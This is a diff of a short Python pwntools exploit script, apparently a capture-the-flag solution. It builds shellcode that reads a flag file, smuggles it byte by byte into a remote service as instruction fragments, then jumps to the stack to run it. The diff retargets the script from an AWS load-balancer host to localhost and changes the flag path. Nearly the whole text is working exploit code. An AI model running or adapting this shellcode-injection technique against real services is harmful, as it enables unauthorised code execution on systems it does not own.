@@ -1,10 +1,8 @@
 #!/usr/bin/python
 from pwn import *
 
-shellcode = asm(shellcraft.cat('/opt/flag',2)+shellcraft.exit())
-#p = process('./nodes')
-p = remote('a27223a8fb11611e7887102abc71843c-611663668.eu-central-1.elb.amazonaws.com',4321)
-#gdb.attach(p)
+shellcode = asm(shellcraft.cat('/flag',2)+shellcraft.exit())
+p = remote('127.0.0.1',4321)
 p.send('\x89\xe7\xeb\x0c') #xor edi,esp
 for s in shellcode:
     p.send('\xb0%s\xeb\x0c' % s) #mov al,(byte)
@@ -12,4 +10,3 @@ for s in shellcode:
 p.send('\xff\xe4\xeb\x0c') #jmp esp
 p.shutdown("out")
 p.interactive()
-
